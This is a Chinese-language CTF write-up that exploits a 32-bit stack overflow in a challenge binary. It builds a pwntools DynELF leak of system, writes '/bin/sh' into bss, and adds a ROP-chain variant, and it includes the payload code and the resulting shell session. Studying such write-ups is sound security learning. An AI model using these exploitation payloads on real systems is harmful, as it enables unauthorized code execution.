第一次用DynELF，过程还是很坎坷

题目链接：https://pan.baidu.com/s/1wqI7YkGzVUefR6951k0pbA

提取码：and4

查壳发现开了NX，在ida里面发现存在栈溢出。system和/bin/sh都没有，且没有提供libc，于是选择用DynELF。

DynELF的使用条件:

不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：

**1）目标程序存在可以泄露libc空间信息的漏洞，如read\@got就指向libc地址空间内；

**2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。

当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。但通过DynELF只能泄露出system的地址，并不能找到’/bin/sh’，所以我们需要把它写到bss段里来执行。

先找到覆盖位置，（0x88+4）的位置开始

总体的思路是布置栈空间来执行。第一次泄露出system的地址返回到main函数，第二次通过read将’/bin/sh\x00’写到bss段里再返回main，第三次执行system(‘/bin/sh’)

先构造leak函数

    def leak(address):

		payload = junk + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)

		r.sendline(payload)

		leaked = r.recv(4)

		print "[%s] -  [%s] = [%s]" % (hex(address), hex(u32(leaked)),repr(leaked))

		return leaked

		d=DynELF(leak,elf=ELF('level4'))

		sys_addr=d.lookup('system','libc')

泄露出system的地址并且返回到了main

第二次布置栈，通过read将’/bin/sh\x00’写到bss里面，再返回main

    payload2='a'*140+p32(read_plt)+p32(main)+p32(0)+p32(bss_addr)+p32(8)

    r.send(payload2)

    r.send('/bin/sh\x00')

注意，第二个输入要用send而不是sendline否则会发生错误，第一个随意

第三次布置栈执行system

    payload3='a'*140+p32(sys_addr)+'a'*4+p32(bss_addr)

    r.sendline(payload3)

    r.interactive()

拿到shell

    [*] Switching to interactive mode

    $ ls

    flag

    level4

    $ whoami

    ctf

    $ cat flag

    CTF{882130cf51d65fb705440b218e94e98e}

    $

因为是32位的题，所以可以在布置栈来解题，但如果是64位的题就不能了，

因为根据X86_64
ABI的调用约定，函数间传递参数不再以压栈的方式，而是以寄存器方式传递参数，前面6个参数依次以rdi,
rsi, rdx, rcx,
r8和r9寄存来传递。在Linux系统，64位架构只使用48位的虚拟地址空间，也即每个地址高16位全部为0，因此在64位系统上，地址已天然零化。

所以这题我们还可以用ROP来做，将read所需要的三个参数通过三个pop弹出。ROPgadget可以帮我们找到是否有3个pop满足条件

    # ROPgadget --binary level4 --only 'pop|ret'

    Gadgets information

    ============================================================

    0x0804850b : pop ebp ; ret

    0x08048508 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret

    0x080482f1 : pop ebx ; ret

    0x0804850a : pop edi ; pop ebp ; ret

    0x08048509 : pop esi ; pop edi ; pop ebp ; ret

    0x080482da : ret

    0x080483ce : ret 0xeac1

    Unique gadgets found: 7

我们用这个0x08048509构造payload

    payload ='a'*140 + p32(read_plt) + p32(ppr) + p32(0)+ p32(bss_addr) +p32(8)

    payload+=p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)

    r.sendline(payload)

    r.sendline('/bin/sh\x00')

拿到shell。

参考链接：https://www.anquanke.com/post/id/85129 
